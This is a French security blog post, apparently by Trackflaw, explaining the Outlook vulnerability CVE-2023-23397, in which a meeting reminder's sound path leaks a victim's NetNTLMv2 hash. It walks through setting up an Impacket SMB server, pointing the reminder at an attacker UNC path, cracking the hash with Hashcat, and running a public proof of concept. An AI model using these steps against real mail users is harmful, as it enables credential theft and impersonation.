# CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.


# ⏰ Le rappel de réunion qui vous veut du mal

## Découverte

Le 14 mars 2023, la société `MdSec` publiait [un article](https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/) traitant d'une nouvelle vulnérabilité corrigée dans la dernière mise à jour proposée par Microsoft.

La vulnérabilité était décrite de la façon suivante : 

{{< admonition quote "Patch KB5005413" >}}
Microsoft Office Outlook contains a privilege escalation vulnerability that allows for a NTLM Relay attack against another service to authenticate as the user.
{{< /admonition >}}

L'analyse d'un [script](https://github.com/microsoft/CSS-Exchange/blob/a4c096e8b6e6eddeba2f42910f165681ed64adf7/docs/Security/CVE-2023-23397.md) d'analyse fournit par Microsoft permet d'obtenir quelques indices sur l'exploitation de cette vulnérabilité.

## Détails techniques

Le script indique certains élements :

```powershell
<#
.SYNOPSIS
    This script audits mails, calendar and task items and check if PidLidReminderFileParameter property is populated or not.
```

```powershell
$searchFilterPidLidReminderFileParameterExists = New-Object Microsoft.Exchange.WebServices.Data.SearchFilter+Exists($mailInfo["PidLidReminderFileParameter"])
$searchFilterCollection.Add($searchFilterPidLidReminderFileParameterExists)
```

```powershell
if (-not $item.RemoveExtendedProperty($mailInfo["PidLidReminderFileParameter"])) {
    Write-Host ("Property already cleared on entry number: $entryCount, Line number: $($entryCount + 1)") -ForegroundColor Yellow
    $invalidEntries.Add($entryCount)
    continue
}
```

Le script recherche les emails contenant l'attribut `PidLidReminderFileParameter`. Ce paramètre permet de contrôler la ressource jouée lors du rappel d'une réunion.

Il est donc possible de conclure :

- Outlook souffre d'un **manque de contrôle sur la saisie de l'utilisateur** qui permet de configurer le son d'un rappel de réunion et de rendez-vous. 
- L'attaquant est effectuable sans aucune manipulation de la part de l'utilisateur (vulnérabilité de type "zero click").
- L'attaquant est capable de forcer une victime à établir une connexion avec son serveur afin de dérober son **condensat NetNTLM**.

Un attaquant exploitant cette vulnérabilité récupère un condensé NetNTLMv2 basé sur le mot de passe de l'utilisateur piégé via une requête SMB. La requête est déclenchée dès que le courrier arrive dans la boîte de réception.

## Exploitation

### Pas à pas

Pour exploiter cette faiblesse il est nécessaire d'agir en plusieurs étapes.

Dans un premier temps, il faut ouvrir un serveur SMB afin de réceptionner le condensat NetNTLM tansmis par la victime (par exemple avec Impacket comme ci-dessous).

```bash
smbserver.py -smb2support EXEGOL .
```

![Serveur SMB](/images/cve-outlook/2023-09-12-17-23-49.png)

Une fois que le serveur est configuré, il faut configuré la réunion. Pour cela, il faut faire pointer le rappel de la réunion vers le serveur de l'attaquant. Par exemple : `\\10.10.10.10\EXEGOL\` pour s'adapter à la commande précédente.

![](/images/cve-outlook/2023-09-12-17-25-33.png)

Le rendez-vous positionné, son arrivée dans la boite mail de la victime déclenche l'envoi d'un condensat NetNTLMv2 vers le serveur de l'attaquant.

![](/images/cve-outlook/2023-09-12-17-27-15.png)

Ce condensat a été créée à partir du mot de passe de la victime. Une attaque par force brute (ci-dessous avec `Hashcat`) à l'aide d'une liste de mot de passe adéquat permet de retrouver le mot de passe exfiltré.

![](/images/cve-outlook/2023-09-12-17-29-19.png)


### PoC final

Le PoC final est réalisable facilement.

![](/images/cve-outlook/poc.gif)


## Automatisation

Ce type d'exploit est facilement automatisable. Un PoC est disponible sur le GitHub de Trackflaw : https://github.com/Trackflaw/CVE-2023-23397

Ce PoC agit en plusieurs étapes :

1. Il créé un fichier `.msg` pointant vers le serveur de l'attaquant.
2. Ce fichier de réunion est mis en pièce jointe d'un email.
3. L'email est transmis à la victime.

Utilisation du PoC

```python
python CVE-2023-23397.py

usage: CVE-2023-23397.py [-h] -p PATH
CVE-2023-23397.py: error: the following arguments are required: -p/--path

python CVE-2023-23397.py --path '\\yourip\'
```

## Risques et remédiations

Les risques pour ce type de vulnérabilité sont nombreux. Un attaquant est en mesure de réaliser un certains nombre d'actions malveillantes :

- Retrouver le mot de passe de l'utilisateur.
- Transmettre le condensat afin de s'authentifier à la place de l'utilisateur.
- Accéder à des ressources réseaux.
- Usurper des identités.
- Compromettre des serveurs et des stations de travail.
- Etc

Afin de se protéger contre cette vulnérabilité, Microsoft a publié un correctif disponible depuis plusieurs jours avant la publication du premier PoC officiel.

## Vidéo

Enfin, une vidéo plus détaillée est disponible sur la chaine YouTube de Trackflaw.

{{< youtube 6bhJPwFgs8Q >}}
